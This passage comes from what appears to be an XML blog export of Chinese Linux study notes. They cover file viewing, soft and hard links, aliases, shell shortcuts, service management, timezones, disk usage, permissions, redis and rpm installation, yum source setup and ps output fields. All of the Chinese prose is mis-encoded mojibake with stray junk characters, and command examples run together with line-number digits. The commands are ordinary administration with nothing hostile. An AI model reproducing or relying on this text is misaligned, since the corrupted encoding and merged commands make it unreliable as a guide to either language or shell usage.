æ˜¾ç¤ºæ–‡ä»¶fileçš„æœ€å10ä¸ªå­—ç¬¦ more æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œæ¯æ¬¡æ˜¾ç¤ºä¸€å± ä½¿ç”¨æ–¹å¼ï¼š æŒ‰Spaceé”®ï¼šæ˜¾ç¤ºæ–‡æœ¬çš„ä¸‹ä¸€å±å†…å®¹ã€‚ æŒ‰Enteré”®ï¼šåªæ˜¾ç¤ºæ–‡æœ¬çš„ä¸‹ä¸€è¡Œå†…å®¹ã€‚ æŒ‰hé”®ï¼šæ˜¾ç¤ºå¸®åŠ©å±ï¼Œè¯¥å±ä¸Šæœ‰ç›¸å…³çš„å¸®åŠ©ä¿¡æ¯ã€‚ æŒ‰bé”®ï¼šæ˜¾ç¤ºä¸Šä¸€å±å†…å®¹ã€‚ æŒ‰qé”®ï¼šé€€å‡ºmoreå‘½ä»¤ã€‚ less åˆ†å±ä¸Šä¸‹ç¿»é¡µæµè§ˆæ–‡ä»¶å†…å®¹ å’Œmoreä½¿ç”¨æ–¹å¼åŸºæœ¬ç±»ä¼¼ æŒ‰eé”®ï¼šå‘ä¸Šæ»šåŠ¨ä¸€è¡Œ æŒ‰yé”®ï¼šå‘ä¸‹æ»šåŠ¨ä¸€è¡Œ Gï¼šè·³åˆ°æ–‡ä»¶æœ«å°¾ ggï¼šè·³åˆ°æ–‡ä»¶é¦–è¡Œ ln ç”¨æ¥ä¸ºæ–‡ä»¶åˆ›ä»¶è¿æ¥ è½¯é“¾æ¥ -s å’Œ ç¡¬é“¾æ¥ ln /mnt/cdrom1 /var/www/html/centos/ â€”&gt;ç¡¬é“¾æ¥ ln -s /mnt/cdrom2 /var/www/html/centos/ â€“&gt;è½¯é“¾æ¥-ç¬¦å·é“¾æ¥ alias åˆ«å æŸ¥çœ‹åˆ«åï¼šalias å®šä¹‰åˆ«åï¼šalias la=&#39;ll -a å–æ¶ˆåˆ«åï¼šunalias la è½¯/ç¡¬ é“¾æ¥ç›¸å…³è½¯é“¾æ¥, ln -s æ–‡ä»¶/æ–‡ä»¶å¤¹ äº§ç”Ÿçš„é“¾æ¥ åˆ›å»ºæ–‡ä»¶çš„è½¯é“¾æ¥ 1ln -s /tmp/yum.log /root/yuntest åˆ›å»ºæ–‡ä»¶å¤¹çš„è½¯é“¾æ¥ 1234# åé¢çš„é“¾æ¥ä¸æŒ‡å®šåå­—, å°±é»˜è®¤ç”¨å‰é¢çš„æºæ–‡ä»¶/æ–‡ä»¶å¤¹åå­—ln -s /tmp /root ---lrwxrwxrwx. 1 root root 4 5æœˆ 29 20:53 tmp -&gt; /tmp å¦‚æœè½¯é“¾æ¥æ˜¯æŒ‡å‘ç›®å½•çš„è¯, æ˜¯å¯ä»¥ç›´æ¥cdè¿›å»çš„, cdè¿›å»çš„æ˜¯çœŸå®çš„ç›®å½•! 12pwd -P: æŸ¥çœ‹è½¯é“¾æ¥çš„çœŸå®æŒ‡å‘æŸç›®å½•(ç‰©ç†ç›®å½•)pwd -L: é€»è¾‘ç›®å½• ç¡¬é“¾æ¥, ln ä¸åŠ s, ä¸€èˆ¬ä¸ä¼šç”¨ ä¸èƒ½é“¾æ¥ç›®å½• ä¸èƒ½è·¨åˆ†åŒºåšç¡¬é“¾æ¥ å…¶å®ƒæœ‰ç”¨çš„å‘½ä»¤123456789101112131415161718manï¼šæ˜¾ç¤ºå‘½ä»¤å¸®åŠ©ä¿¡æ¯clearï¼šæ¸…å±ï¼Œæˆ–è€…æŒ‰ctrl + lä¹Ÿè¡Œctrl + cï¼šé€€å‡ºå½“å‰è¿›ç¨‹ctrl + zï¼šæŒ‚èµ·å½“å‰å‰å°è¿›ç¨‹whatisï¼šå‘½ä»¤æ˜¯ä»€ä¹ˆwhereisï¼šåœ¨æ ‡å‡†è·¯å¾„ä¸‹æœç´¢ä¸åç§°ç›¸å…³çš„æ–‡ä»¶ï¼Œwhereiså°†æ‰€æœ‰æœç´¢åˆ°çš„æ–‡ä»¶éƒ½æ˜¾ç¤ºwhichï¼šwhichåœ¨è®¾å®šçš„æœç´¢è·¯å¾„ä¸‹è¿›è¡Œç›®å½•æœç´¢ï¼Œåªæ˜¾ç¤ºæœç´¢åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶suï¼šåˆ‡æ¢ç”¨æˆ·historyï¼šæ˜¾ç¤ºå†å²å‘½ä»¤hostnameï¼šæ˜¾ç¤ºä¸»æœºåsetï¼šæŸ¥çœ‹ç³»ç»Ÿå˜é‡getï¼šä¸‹è½½æ–‡ä»¶putï¼šä¸Šä¼ æ–‡ä»¶sudoï¼šä»¥rootç”¨æˆ·æƒé™æ‰§è¡Œä¸€æ¬¡å‘½ä»¤exitï¼šé€€å‡ºç™»å½•çŠ¶æ€wï¼šæ˜¾ç¤ºå½“å‰è¿æ¥çš„ç”¨æˆ·whoï¼šæ˜¾ç¤ºå½“å‰ä¼šè¯ä¿¡æ¯uptimeï¼šæŸ¥çœ‹ç³»ç»Ÿè¿è¡Œæ—¶é—´ ä½¿ç”¨å°æŠ€å·§(é‡ç‚¹)12345678910111213141516171819202122ctrl + uï¼šæ¸…é™¤å…‰æ ‡å‰çš„å‘½ä»¤ï¼Œç›¸å½“äºå‰ªåˆ‡ # !ctrl + kï¼šæ¸…é™¤å…‰æ ‡åçš„å‘½ä»¤ï¼Œç›¸å½“äºå‰ªåˆ‡ # !ctrl + yï¼šç²˜è´´ # !ctrl + tï¼šæŠŠå…‰æ ‡å‰é¢çš„é‚£ä¸ªå­—ç¬¦å¾€åæŒªåŠ¨ä¸€ä½ctrl + lï¼šæ¸…å±ctrl + a: ç§»åˆ°å‘½ä»¤è¡Œé¦– # !ctrl + e: ç§»åˆ°å‘½ä»¤è¡Œå°¾ # !ctrl + â† â†’: å…‰æ ‡ç§»åŠ¨ä¸€ä¸ªå•è¯ # !!!ï¼šæ‰§è¡Œä¸Šä¸€æ¬¡å‘½ä»¤ # !!$ï¼šä¸Šä¸ªå‘½ä»¤çš„æœ€åä¸€ä¸ªå•è¯ctrl + wï¼šåˆ é™¤å…‰æ ‡å‰ä¸€ä¸ªå•è¯cd data; cat sed.txtï¼šè¡¨ç¤ºå…ˆæ‰§è¡Œcdï¼Œç„¶åæ‰§è¡Œcatï¼Œå·¥ä½œç›®å½•ä¼šåˆ‡æ¢(cd data; cat sed.txt)ï¼šè·Ÿä¸Šä¸ªå‘½ä»¤ç›¸æ¯”ï¼Œä¸åˆ‡æ¢å·¥ä½œç›®å½•|ï¼šç®¡é“ç¬¦ï¼Œè¡¨ç¤ºæŠŠå‰é¢å‘½ä»¤å†…å®¹çš„è¾“å‡ºå½“åšåé¢å‘½ä»¤çš„è¾“å…¥&gt;ï¼šè¡¨ç¤ºå†…å®¹è¦†ç›–&gt;&gt;ï¼šè¡¨ç¤ºå†…å®¹è¿½åŠ # -----#æŸ¥çœ‹å†…å­˜ æŸ¥çœ‹å‰©ä½™å†…å­˜xcall.sh "free -h"#æŸ¥çœ‹å‰©ä½™ç¡¬ç›˜xcall.sh "df -h"]]></content>
      <categories>
        <category>Linux</category>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxå­¦ä¹ ç¬”è®°-3]]></title>
    <url>%2F2018%2F05%2F25%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3%2F</url>
    <content type="text"><![CDATA[1. ç³»ç»ŸæœåŠ¡ç®¡ç† æ£€æŸ¥æœ¬æœºhttpdæœåŠ¡æ˜¯å¦å¼€å¯, ä½¿ç”¨å‘½ä»¤service httpd status å¼€å¯/å…³é—­/é‡å¯ httpdæœåŠ¡ service httpd start/stop/restart æŸ¥çœ‹æ‰€æœ‰çš„æœåŠ¡çŠ¶æ€ service --status-all è¿‡æ»¤å‡ºæŸä¸ªæœåŠ¡service â€“status-all | grep httpd` é˜²ç«å¢™æœåŠ¡ sevice iptables status/stop/start/restart é…ç½®åå°æœåŠ¡è¿›ç¨‹å¼€æœºè‡ªå¯ 12345# å¼€å¯å¼€æœºè‡ªå¯httpè¿›ç¨‹-&gt; chkconfig httpd on# æŸ¥çœ‹httpdçš„å¼€æœºè‡ªå¯çŠ¶æ€-&gt; chkconfig --list | grep httpdhttpd 0:å…³é—­ 1:å…³é—­ 2:å¯ç”¨ 3:å¯ç”¨ 4:å¯ç”¨ 5:å¯ç”¨ 6:å…³é—­ ç¼ºçœç³»ç»Ÿè¿è¡Œçº§åˆ« 0 ä¸ºåœæœºï¼Œæœºå™¨å…³é—­ã€‚ 1 ä¸ºå•ç”¨æˆ·æ¨¡å¼ï¼Œå°±åƒWin9xä¸‹çš„å®‰å…¨æ¨¡å¼ç±»ä¼¼ã€‚ 2 ä¸ºå¤šç”¨æˆ·æ¨¡å¼ï¼Œä½†æ˜¯æ²¡æœ‰NFSæ”¯æŒã€‚ 3 ä¸ºå®Œæ•´çš„å¤šç”¨æˆ·æ¨¡å¼ï¼Œæ˜¯æ ‡å‡†çš„è¿è¡Œçº§ã€‚ 4 ä¸€èˆ¬ä¸ç”¨ï¼Œåœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹å¯ä»¥ç”¨å®ƒæ¥åšä¸€äº›äº‹æƒ…ã€‚ä¾‹å¦‚åœ¨ç¬”è®°æœ¬ ç”µè„‘çš„ç”µæ± ç”¨å°½æ—¶ï¼Œå¯ä»¥åˆ‡æ¢åˆ°è¿™ä¸ªæ¨¡å¼æ¥åšä¸€äº›è®¾ç½®ã€‚ 5 å°±æ˜¯X11ï¼Œè¿›åˆ°X Windowç³»ç»Ÿäº†ã€‚ 6 ä¸ºé‡å¯ï¼Œè¿è¡Œinit 6æœºå™¨å°±ä¼šé‡å¯ã€‚ Centosä¸­æ—¶åŒº å½“å‰æ­£åœ¨ä½¿ç”¨çš„æ—¶dåŒºæ–‡ä»¶ä½äº /etc/localtime å…¶ä»–æ—¶åŒºæ–‡ä»¶åˆ™ä½äº /usr/share/zoneinfo ä¸­å›½æ—¶åŒºä½¿ç”¨ /usr/share/zoneinfo/Asia/Shanghai æ›´æ”¹æ—¶åŒº cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime å¦‚æœæ²¡æœ‰ Asia/Shanghai æ—¶åŒºæ–‡ä»¶ï¼Œè¯·ä½¿ç”¨tzselectå‘½ä»¤å»ç”Ÿæˆæ—¶åŒºæ–‡ä»¶ï¼Œç”Ÿæˆå¥½çš„æ—¶åŒºæ–‡ä»¶å°±åœ¨ /usr/share/zoneinfoç›®å½•ä¸‹ ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ date : ç›´æ¥æŸ¥çœ‹æ—¶é—´ date -s : æ‰‹åŠ¨è®¾ç½®æ—¶é—´ sudo ntpdate ntp1.aliyun.com : åŒæ­¥æ—¶é—´æœåŠ¡å™¨æ—¶é—´ 2. ç®€å•ç£ç›˜ç®¡ç† dfï¼šåˆ—å‡ºæ–‡ä»¶ç³»ç»Ÿçš„æ•´ä½“ç£ç›˜ä½¿ç”¨é‡ -h äººæ€§åŒ–çš„åˆ—å‡ºæ–‡ä»¶çš„å¤§å°ç­‰ 123-&gt; # df -h /dev/sr0Filesystem Size Used Avail Use% Mounted on/dev/sr0 3.7G 3.7G 0 100% /media/cdrom duï¼šæ£€æŸ¥ç£ç›˜ç©ºé—´ä½¿ç”¨é‡ fdiskï¼šç”¨äºç£ç›˜åˆ†åŒº 3. æ–‡ä»¶çš„åŸºæœ¬å±æ€§å‰ç¼€çš„å«ä¹‰ 1234567# æŸ¥çœ‹ç›®å½•çš„æƒé™-&gt; # ll -d /var/www/html/localyum ls -ld ä¹Ÿæ˜¯ä¸€æ ·, æŸ¥çœ‹ç›®å½•çš„æƒé™drwxr-xr-x. 7 root root 4096 5æœˆ 25 07:50 autojump-rw-r--r--. 1 root root 50434 5æœˆ 23 10:11 install.loglrwxrwxrwx. 1 root root 13 5æœˆ 25 21:04 localyum -&gt; /media/cdrom/ å½“ä¸º[ d ]åˆ™æ˜¯ç›®å½• å½“ä¸º[ - ]åˆ™æ˜¯æ–‡ä»¶ï¼› è‹¥æ˜¯[ l ]åˆ™è¡¨ç¤ºä¸ºé“¾æ¥æ–‡æ¡£(link file)ï¼› è‹¥æ˜¯[ b ]åˆ™è¡¨ç¤ºä¸ºè£…ç½®æ–‡ä»¶é‡Œé¢çš„å¯ä¾›å‚¨å­˜çš„æ¥å£è®¾å¤‡(å¯éšæœºå­˜å–è£…ç½®)ï¼› è‹¥æ˜¯[ c ]åˆ™è¡¨ç¤ºä¸ºè£…ç½®æ–‡ä»¶é‡Œé¢çš„ä¸²è¡Œç«¯å£è®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡(ä¸€æ¬¡æ€§è¯»å–è£…ç½®); rã€wã€x å¯¹äºæ–‡ä»¶å’Œç›®å½•çš„å«ä¹‰ æƒé™ å¯¹æ–‡ä»¶çš„å«ä¹‰ å¯¹ç›®å½•çš„å«ä¹‰ r è¯»æƒé™ å¯ä»¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ å¯ä»¥åˆ—å‡ºç›®å½•ä¸­çš„å†…å®¹ w å†™æƒé™ å¯ä»¥ä¿®æ”¹æ–‡ä»¶å†…å®¹ å¯ä»¥å†ç›®å½•ä¸­åˆ›å»ºã€åˆ é™¤æ–‡ä»¶ x æ‰§è¡Œæƒé™ å¯ä»¥æ‰§è¡Œæ–‡ä»¶ å¯ä»¥è¿›å…¥ç›®å½• 4. è½¯ä»¶å®‰è£… TODO1. äºŒè¿›åˆ¶å‘å¸ƒåŒ…å®‰è£… TODO:è½¯ä»¶å·²ç»é’ˆå¯¹å…·ä½“å¹³å°ç¼–è¯‘æ‰“åŒ…å‘å¸ƒï¼Œåªè¦è§£å‹ï¼Œä¿®æ”¹é…ç½®å³å¯ å®‰è£…jdk , å®‰è£…tomcatä¹Ÿä¸€æ · TODO: é€šè¿‡ ftpå·¥å…·æŠŠ jdkä¼ åˆ° linuxæœåŠ¡å™¨ åˆ›å»ºä¸€ä¸ª /var/www/html/soft/jdk8 çš„è½¯é“¾æ¥, æŒ‡å‘æœåŠ¡å™¨ä¸­çš„å®‰è£…åŒ… â€”â€” è¿™ä¸€æ­¥å¤±è´¥äº†, å…ˆæç½®æŠŠ, å…ˆcopyè¿‡å». 2. æºç ç¼–è¯‘å®‰è£… TODO:è½¯ä»¶ä»¥æºç å·¥ç¨‹çš„å½¢å¼å‘å¸ƒï¼Œéœ€è¦è·å–åˆ°æºç å·¥ç¨‹åç”¨ç›¸åº”å¼€å‘å·¥å…·è¿›è¡Œç¼–è¯‘æ‰“åŒ…éƒ¨ç½² å®‰è£…/å¸è½½ redis å¸è½½: é¦–å…ˆæŸ¥çœ‹redis-serveræ˜¯å¦å¯åŠ¨ ps aux | grep redis æœ‰çš„è¯, å…³é—­è¿™äº›è¿›ç¨‹ kill -9 è¿›ç¨‹pid åˆ é™¤redisç›¸åº”çš„æ–‡ä»¶å¤¹å°±å¯ä»¥äº†ã€‚ find / -name redis å®‰è£…: æ‹·è´åˆ°/usr/local, è§£å‹, åˆ æ‰åŸå®‰è£…åŒ… 12tar -zxvf redis-3.0.0.tar.gz rm redis-3.0.0.tar.gz æ£€æŸ¥è¿è¡Œç¯å¢ƒ 123# æ£€æµ‹ä¸€ä¸‹æ˜¯å¦å¯ä»¥å®‰è£…makemake test å®‰è£…åˆ°æŒ‡å®šç›®å½• 1make PREFIX=/root/apps/redis install æ‹·è´é…ç½®ä¿¡æ¯ 1cp /usr/local/redis-3.0.0/redis.conf /usr/local/redis/bin å¯åŠ¨ å‰ç«¯æ¨¡å¼ bin/redis-server åç«¯æ¨¡å¼å¯åŠ¨ ä¿®æ”¹redis.confé…ç½®æ–‡ä»¶ï¼Œdaemonize yes` ä»¥åç«¯æ¨¡å¼å¯åŠ¨ : TODO 3. RPMå‘å¸ƒåŒ…è½¯ä»¶å·²ç»æŒ‰ç…§RedHatï¼ˆRedhat Package Managerï¼‰çš„åŒ…ç®¡ç†å·¥å…·è§„èŒƒRPMè¿›è¡Œæ‰“åŒ…å‘å¸ƒï¼Œéœ€è¦è·å–åˆ°ç›¸åº”çš„è½¯ä»¶RPMå‘å¸ƒåŒ…ï¼Œç„¶åç”¨rpmå‘½ä»¤è¿›è¡Œå®‰è£… Mysqlå®‰è£… 1234567891011121314151617181920# rpmå®‰è£…å‘½ä»¤1ã€å®‰è£…åŒ…ï¼šrpm -ivh åŒ…åå‚æ•°ï¼š-i ï¼šå®‰è£…çš„æ„æ€-v ï¼šå¯è§†åŒ–-h ï¼šæ˜¾ç¤ºå®‰è£…è¿›åº¦å¦å¤–åœ¨å®‰è£…ä¸€ä¸ªrpmåŒ…æ—¶å¸¸ç”¨çš„é™„å¸¦å‚æ•°æœ‰ï¼š--force å¼ºåˆ¶å®‰è£…ï¼Œå³ä½¿è¦†ç›–å±äºå…¶ä»–åŒ…çš„æ–‡ä»¶ä¹Ÿè¦å®‰è£…--nodeps å½“è¦å®‰è£…çš„rpmåŒ…ä¾èµ–å…¶ä»–åŒ…æ—¶ï¼Œå³ä½¿å…¶ä»–åŒ…æ²¡æœ‰å®‰è£…ï¼Œä¹Ÿè¦å®‰è£…è¿™ä¸ªåŒ…2ã€å‡çº§åŒ…ï¼šrpm -Uvh filename-U å‡çº§3ã€å¸è½½åŒ…rpm -e filename ï¼ˆè¿™é‡Œçš„filenameæ˜¯é€šè¿‡rpmçš„æŸ¥è¯¢åŠŸèƒ½æ‰€æŸ¥è¯¢åˆ°çš„ï¼‰4ã€æŸ¥è¯¢ä¸€ä¸ªåŒ…æ˜¯å¦å®‰è£…ï¼šrpm -q åŒ…åï¼ˆè¿™é‡Œçš„åŒ…åï¼Œæ˜¯ä¸å¸¦æœ‰å¹³å°ä¿¡æ¯ä»¥åŠåç¼€åçš„ï¼‰5.æŸ¥è¯¢å½“å‰å®‰è£…çš„æ‰€æœ‰rpmåŒ…ï¼šrpm -qaæŸ¥è¯¢å½“å‰å®‰è£…çš„å’Œsqlç›¸å…³çš„åŒ…ï¼šrpm -qa | grep 'sql'æŸ¥è¯¢sqliteå®‰è£…è·¯å¾„ï¼šrpm -ql sqlite 5. è®¾ç½®æœ¬åœ°/ç½‘ç»œyumæº é¦–å…ˆæ£€æŸ¥è™šæ‹Ÿæœºçš„ CD/DVDé©±åŠ¨å™¨æ˜¯å¦æœ‰æŒ‚è½½isoé•œåƒæ–‡ä»¶ æ‰¾åˆ°æŒ‚è½½æºçš„ä½ç½® åœ¨ /dev/sr0ä¸‹, å°†å…¶æŒ‚è½½åˆ°/mntä¸‹åˆ›å»ºçš„cdromæ–‡ä»¶å¤¹ä¸‹ mount -t iso9660 -o ro /dev/sr0 /media/cdrom é…ç½®å¼€æœºæŒ‚è½½ , vi /etc/fstab, å¢åŠ ä¸€è¡Œ /dev/cdrom /media/cdrom iso9660 defaults 0 0 åˆ›å»ºè½¯è¿æ¥, è®¾ç½®å¯ä»¥é€šè¿‡webè®¿é—® ln -s /mnt/cdrom/ /var/www/html/yumsorurce ä¿®æ”¹etc/yum.repos.dä¸­çš„æ–‡ä»¶entOS-Media.repoä¸­çš„enabled=1, å¼€å¯ä»æœ¬åœ°å¯»æ‰¾, å› ä¸ºæ–‡ä»¶ä¸­, åŸæœ¬å°±é…ç½®äº†baseurl: file:///media/cdrom/, è€Œæˆ‘ä»¬è‡ªå·±åˆ›å»ºäº†media/cdromè¿™ä¸ªç›®å½•, æ‰€ä»¥å°±å¯ä»¥ä»è¿™é‡Œé¢è¯»å–äº† æ‰§è¡Œyum repolist, å‘ç°å·²ç»èƒ½è¯»å–å‡ºmediaä¸­çš„repoäº†, å¤§åŠŸå‘Šæˆ c6-media CentOS-6 - Media 6,575 tips: ä¸ªäººè§‰å¾—è¿˜æ˜¯é…ç½®ä¸ªç½‘ç»œæºæ¯”è¾ƒå¥½, æ¯”å¦‚163/é˜¿é‡Œçš„. 12345678910111213141516171819# æ“ä½œæ­¥éª¤# 1.å¤‡ä»½åŸæ¥çš„Baseæºcd /etc/yum.repos.d/mv CentOS-Base.repo CentOS-Base.repo_bak# 2. ä¸‹è½½ç½‘æ˜“/é˜¿é‡Œæº åˆ°/etc/yum.repos.dä¸‹, æ›¿æ¢æ‰åŸæœ¬çš„# ç½‘æ˜“æºwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo# é˜¿é‡Œæºwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repoyum clean allyum makecache# yumä½¿ç”¨yum update ô»¦ô»§ô·‰ô·Šå‡çº§ç³»ç»Ÿyum install -y xxx ç›´æ¥å®‰è£…, ä¸ç”¨ç¡®è®¤ô»ˆyum update ~ ô»¦ô»§ô¸»ô¹ºô·œ å‡çº§æŒ‡å®šè½¯ä»¶åŒ…yum remove ~ ôºŒô·ô¸»ô¹ºô·œô·• å¸è½½æŒ‡å®šè½¯ä»¶ æŒ‚è½½, é…ç½®æºçš„å…¶ä»–è¯´æ˜ 12345678910111213141516171819202122232425# å…³äºæŒ‚è½½# lrwxrwxrwx. 1 root root 3 5æœˆ 25 16:47 cdrom -&gt; sr0cdromå…¶å®æ˜¯sr0çš„è½¯é“¾æ¥, å› æ­¤ç›´æ¥æ‰¾sr0å³å¯# æŒ‚è½½çš„åŸºæœ¬è¯­æ³•mont -t iso9660 -o ro(åªè¯») /dev/sr0 /mnt/cdrom (æŒ‚è½½ç±»å‹) (æŒ‚è½½æ–¹å¼) (æŒ‚è½½æº) (æŒ‚è½½ç‚¹)# å¸è½½çš„è¯­æ³•umount /mnt/cdrom å¦‚æœå¸è½½æ—¶é‡åˆ° umount: /mnt/cdrom: device is busy.è§£å†³æ–¹å¼: 1. æŸ¥æ‰¾å“ªä¸ªè¿›ç¨‹åœ¨ç”¨: fuser /mnt/cdrom 2. æŸ¥æ‰¾è¿›ç¨‹: ps -ef | grep è¿›ç¨‹å· 3. æ’æ­»è¿›ç¨‹: kill -9 è¿›ç¨‹å·, å¦‚æœæ˜¯rootç”¨æˆ·, å¯èƒ½ä¼šæ–­å¼€è¿æ¥, éœ€è¦é‡è¿ 4. ç„¶åç»§ç»­ umount, å¦‚æœä¸è¡Œ, å°±å¼ºåˆ¶å¸è½½ umount -f /mnt/cdrom# å…³äºetc/yum.repos.d ä¸­æ–‡ä»¶çš„è¯´æ˜ CentOS-Base.repoï¼šæœ‰ç½‘çš„ç¯å¢ƒä¸‹é»˜è®¤ä½¿ç”¨è¿™ä¸ªï¼Œè¿™ä¸ªæ˜¯ç¬¬ä¸€ä¼˜å…ˆçº§ã€‚å› ä¸ºæ²¡ç½‘ï¼Œæ‰€ä»¥ä¿®æ”¹æ–‡ä»¶åï¼Œè®¾ç½®æˆå¤‡ä»½æ–‡ä»¶ã€‚è¿™æ ·ç³»ç»Ÿå°±ä¼šä½¿ç”¨ç¬¬äºŒä¼˜å…ˆçº§çš„æ–‡ä»¶ã€‚ CentOS-Media.repoï¼šæ²¡ç½‘çš„ç¯å¢ƒä¸‹ä½¿ç”¨è¿™ä¸ªï¼Œåœ¨ä¸Šå›¾ä¸­ä¼šå‘ç°ä»–é»˜è®¤é…ç½®äº†4ä¸ªè·¯å¾„ï¼Œç¬¬4ä¸ªyumsourceæ˜¯æˆ‘è‡ªå·±åŠ çš„ã€‚æ„æ€æ˜¯è¯´ï¼Œå¦‚æœç³»ç»Ÿæ£€æµ‹yumä½¿ç”¨äº†ç¦»çº¿å®‰è£…ï¼Œé‚£ä¹ˆä¼šä»ä¸Šåˆ°ä¸‹ä»è¿™4ä¸ªè·¯å¾„ä¸­æŸ¥æ‰¾å®‰è£…è½¯ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠå…‰ç›˜æŒ‚è½½åœ¨è¿™å››ä¸ªç›®å½•ä¸‹çš„ä»»æ„ä¸€ä¸ªç›®å½•å³å¯ã€‚åŒæ—¶ï¼Œè¯¥é…ç½®æ–‡ä»¶é»˜è®¤æ˜¯ä¸å¯ç”¨çš„ï¼Œå¦‚æœæƒ³ä½¿ç”¨éœ€è¦ä¿®æ”¹å€’æ•°ç¬¬äºŒè¡Œçš„enabledä¸º1ï¼Œå¦åˆ™è¯¥æ–‡ä»¶æ— æ•ˆã€‚ # /mnt &amp; /media ç›®å½•çš„åŒºåˆ«mediaï¼šæŒ‚è½½ä¸€äº›ç§»åŠ¨è®¾å¤‡ï¼Œä¾‹å¦‚å…‰ç›˜ï¼ŒUç›˜ç­‰ã€‚mntï¼š æŒ‚è½½ä¸€äº›ç¡¬ç›˜ç­‰è®¾å¤‡ã€‚æ‰€ä»¥æˆ‘ä»¬çš„å…‰ç›˜åº”è¯¥æŒ‚è½½åœ¨mediaç›®å½•ä¸‹ï¼Œä»yumç»™çš„é»˜è®¤é…ç½®æ–‡ä»¶ä¹Ÿèƒ½çœ‹å‡ºã€‚ 6. è¿›ç¨‹ç›¸å…³1. pså‘½ä»¤pså‘½ä»¤ç”¨äºæŠ¥å‘Šå½“å‰ç³»ç»Ÿçš„è¿›ç¨‹çŠ¶æ€ã€‚å¯ä»¥æ­é…killæŒ‡ä»¤éšæ—¶ä¸­æ–­ã€åˆ é™¤ä¸å¿…è¦çš„ç¨‹åºã€‚ å¸¸ç”¨é€‰é¡¹åŒ…æ‹¬ï¼š 123456ps -1ã€-aæ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·çš„è¿›ç¨‹2ã€-uæ˜¾ç¤ºç”¨æˆ·åå’Œå¯åŠ¨æ—¶é—´3ã€-xæ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ï¼ŒåŒ…æ‹¬æ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹4ã€-eæ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ï¼ŒåŒ…æ‹¬æ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ï¼Œè¾ƒxé€‰é¡¹ï¼Œä¿¡æ¯æ›´ä¸ºç®€ç•¥5ã€-læ˜¾ç¤ºè¿›ç¨‹è¯¦ç»†ä¿¡æ¯ï¼ŒæŒ‰é•¿æ ¼å¼æ˜¾ç¤º å¸¸ç”¨ç»„åˆ ps -au æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·è¿›ç¨‹ï¼Œå¹¶ç»™å‡ºç”¨æˆ·åå’Œå¯åŠ¨æ—¶é—´ç­‰è¯¦ç»†ä¿¡æ¯ ps -aux æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·è¿›ç¨‹ï¼ŒåŒ…æ‹¬æ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ï¼Œå¹¶ç»™å‡ºç”¨æˆ·å’Œå’Œå¯åŠ¨åŸ‹å•ç­‰è¯¦ç»†ä¿¡æ¯ ps -el æŒ‰é•¿æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹è¯¦ç»†ä¿¡æ¯ 1234567891011121314151617181920212223242526272829303132# ä¸Šè¿°å‘½ä»¤å¯èƒ½å‡ºç°çš„å­—æ®µå«ä¹‰USER: è¿›ç¨‹æ‰€æœ‰è€…PID: è¿›ç¨‹å·PPID: è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ID%CPU: CPUå ç”¨ç‡C: è¿›ç¨‹çš„CPUå ç”¨ç‡%MEM: å†…å­˜å ç”¨ç‡VSZ: è¡¨ç¤ºå¦‚æœä¸€ä¸ªç¨‹åºå®Œå…¨é©»ç•™åœ¨å†…å­˜çš„è¯éœ€è¦å ç”¨å¤šå°‘å†…å­˜ç©ºé—´;RSS: æŒ‡æ˜äº†å½“å‰å®é™…å ç”¨äº†å¤šå°‘å†…å­˜;TTY: ç»ˆç«¯çš„æ¬¡è¦è£…ç½®å·ç  (minor device number of tty)Fï¼šè¿›ç¨‹çš„æ ‡å¿—Sï¼šè¿›ç¨‹çš„çŠ¶æ€STAT: è¯¥è¿›ç¨‹ç¨‹çš„çŠ¶æ€ï¼Œæœ‰ä»¥ä¸‹å€¼D: ä¸å¯ä¸­æ–­çš„é™æ­¢R: æ­£åœ¨æ‰§è¡Œä¸­S: é™æ­¢çŠ¶æ€T: æš‚åœæ‰§è¡ŒZ: ä¸å­˜åœ¨ä½†æš‚æ—¶æ— æ³•æ¶ˆé™¤W: æ²¡æœ‰è¶³å¤Ÿçš„è®°å¿†ä½“åˆ†é¡µå¯åˆ†é…&lt;: é«˜ä¼˜å…ˆåºçš„è¿›ç¨‹N: ä½ä¼˜å…ˆåºçš„è¿›ç¨‹L: æœ‰è®°å¿†ä½“åˆ†é¡µåˆ†é…å¹¶é”åœ¨è®°å¿†ä½“å†…PRIï¼šè¿›ç¨‹çš„ä¼˜å…ˆæƒNIï¼šè¿›ç¨‹çš„Niceå€¼ADDRï¼šè¿›ç¨‹çš„åœ°å€ç©ºé—´SZï¼šè¿›ç¨‹å ç”¨å†…å­˜çš„å¤§å°WCHANï¼šè¿›ç¨‹å½“å‰æ˜¯å¦åœ¨è¿è¡ŒTTYï¼šè¿›ç¨‹æ‰€å±ç»ˆç«¯START: è¿›ç¨‹å¼€å§‹æ—¶é—´TIME: æ‰§è¡Œçš„è¿è¡Œæ—¶é—´COMMANDï¼šæ‰€æ‰§è¡Œçš„æŒ‡ä»¤CMDï¼šè¿›ç¨‹çš„å‘½ä»¤ 2. kill / pidof / pkill 